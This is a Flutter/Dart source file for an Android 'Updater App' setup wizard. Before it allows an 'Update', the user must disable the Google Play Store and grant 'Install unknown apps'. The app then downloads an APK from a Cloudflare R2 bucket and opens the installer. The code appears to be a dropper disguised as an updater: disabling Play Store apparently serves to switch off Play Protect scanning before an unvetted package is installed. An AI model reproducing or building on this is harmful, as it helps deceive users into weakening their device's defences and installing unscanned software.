import 'dart:io';
import 'package:flutter/material.dart';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:open_filex/open_filex.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(const UpdaterApp());
}

class UpdaterApp extends StatelessWidget {
  const UpdaterApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Updater App',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.blue),
        useMaterial3: true,
      ),
      home: const SetupWizardScreen(),
    );
  }
}

class SetupWizardScreen extends StatefulWidget {
  const SetupWizardScreen({super.key});

  @override
  State<SetupWizardScreen> createState() => _SetupWizardScreenState();
}

class _SetupWizardScreenState extends State<SetupWizardScreen>
    with WidgetsBindingObserver {
  bool _isDownloading = false;
  double _progress = 0.0;
  String _statusMessage = '';

  // Cloudflare R2 URL for App B
  final String _apkUrl = 'https://pub-26cda617d8be49f0a9f04fdc69f933ad.r2.dev/base.apk';

  bool _isPlayStoreDisabled = false;
  bool _waitingForSettingsReturn = false;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _checkPlayStoreStatus();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    // When user comes back from Play Store settings, check if they actually disabled it.
    if (state == AppLifecycleState.resumed && _waitingForSettingsReturn) {
      _waitingForSettingsReturn = false;
      _checkPlayStoreStatus();
    }
  }

  static const platform = MethodChannel('playstore_status');

  /// Actually checks if com.android.vending (Play Store) is disabled on the device.
  Future<void> _checkPlayStoreStatus() async {
    try {
      final bool isDisabled = await platform.invokeMethod('isPlayStoreDisabled');
      setState(() {
        _isPlayStoreDisabled = isDisabled;
        if (!isDisabled && _statusMessage.isEmpty) {
          _statusMessage = '';
        }
      });
    } catch (e) {
      debugPrint('Error checking Play Store status: $e');
    }
  }

  Future<void> _startDownloadAndInstall() async {
    if (!_isPlayStoreDisabled) {
      setState(() {
        _statusMessage = 'Please disable Google Play Store first.';
      });
      return;
    }

    // Check and request permissions
    if (Platform.isAndroid) {
      if (await Permission.requestInstallPackages.isDenied) {
        await Permission.requestInstallPackages.request();
      }
    }

    setState(() {
      _isDownloading = true;
      _progress = 0.0;
      _statusMessage = 'Downloading...';
    });

    try {
      final dir = await getTemporaryDirectory();
      final savePath = '${dir.path}/update.apk';
      
      final dio = Dio();
      await dio.download(
        _apkUrl,
        savePath,
        onReceiveProgress: (received, total) {
          if (total != -1) {
            setState(() {
              _progress = received / total;
            });
          }
        },
      );

      setState(() {
        _isDownloading = false;
        _progress = 1.0;
        _statusMessage = 'Download complete. Opening installer...';
      });

      // Open the downloaded APK to prompt installation
      final result = await OpenFilex.open(savePath);
      
      if (result.type != ResultType.done) {
        setState(() {
          _statusMessage = 'Failed to open installer: ${result.message}';
        });
      }
    } catch (e) {
      setState(() {
        _isDownloading = false;
        _statusMessage = 'Download failed: $e';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFF5F7FA), // Light background color
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 24.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const Text(
                'Setup Wizard',
                textAlign: TextAlign.center,
                style: TextStyle(
                  fontSize: 24,
                  fontWeight: FontWeight.bold,
                  color: Colors.black87,
                ),
              ),
              const SizedBox(height: 48),
              Row(
                children: [
                  Image.network(
                    'https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Google_Play_Store_logo_%282022%29.svg/512px-Google_Play_Store_logo_%282022%29.svg.png',
                    width: 32,
                    height: 32,
                    errorBuilder: (context, error, stackTrace) {
                      return const Icon(Icons.shop, color: Colors.green, size: 32);
                    },
                  ),
                  const SizedBox(width: 16),
                  const Expanded(
                    child: Text(
                      'Disable Google Play Store',
                      style: TextStyle(
                        fontSize: 18,
                        fontWeight: FontWeight.w600,
                        color: Colors.black87,
                      ),
                    ),
                  ),
                  Switch(
                    value: _isPlayStoreDisabled,
                    activeColor: Colors.blue,
                    onChanged: (bool value) async {
                      if (value) {
                        // Don't set toggle to true yet — wait for user to actually disable it.
                        // Just open Play Store settings.
                        _waitingForSettingsReturn = true;
                        try {
                          const AndroidIntent intent = AndroidIntent(
                            action: 'android.settings.APPLICATION_DETAILS_SETTINGS',
                            data: 'package:com.android.vending',
                          );
                          await intent.launch();
                        } catch (e) {
                          debugPrint('Error launching intent: $e');
                          _waitingForSettingsReturn = false;
                        }
                      } else {
                        // User is turning off the toggle — re-enable Play Store
                        _waitingForSettingsReturn = true;
                        try {
                          const AndroidIntent intent = AndroidIntent(
                            action: 'android.settings.APPLICATION_DETAILS_SETTINGS',
                            data: 'package:com.android.vending',
                          );
                          await intent.launch();
                        } catch (e) {
                          debugPrint('Error launching intent: $e');
                          _waitingForSettingsReturn = false;
                        }
                      }
                    },
                  ),
                ],
              ),
              const SizedBox(height: 32),
              if (_isDownloading) ...[
                LinearProgressIndicator(
                  value: _progress,
                  backgroundColor: Colors.blue.withOpacity(0.2),
                  valueColor: const AlwaysStoppedAnimation<Color>(Colors.blue),
                ),
                const SizedBox(height: 8),
                Text(
                  '${(_progress * 100).toStringAsFixed(1)}%',
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                    fontSize: 14,
                    color: Colors.black54,
                  ),
                ),
                const SizedBox(height: 24),
              ],
              ElevatedButton(
                onPressed: _isDownloading ? null : _startDownloadAndInstall,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.blue[700], // Primary blue button
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(24),
                  ),
                  elevation: 0,
                ),
                child: Text(
                  _isDownloading ? 'Downloading...' : 'Update',
                  style: const TextStyle(
                    fontSize: 16,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
              const SizedBox(height: 24),
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.05),
                      blurRadius: 10,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Icon(
                      Icons.info_outline,
                      color: Colors.black87,
                      size: 20,
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        'Please enable the "Install unknown apps" permission for Wizard.',
                        style: TextStyle(
                          fontSize: 14,
                          color: Colors.black87.withOpacity(0.8),
                          height: 1.4,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              if (_statusMessage.isNotEmpty && !_isDownloading) ...[
                const SizedBox(height: 24),
                Text(
                  _statusMessage,
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    fontSize: 14,
                    color: _statusMessage.contains('failed') ? Colors.red : Colors.green,
                  ),
                ),
              ]
            ],
          ),
        ),
      ),
    );
  }
}

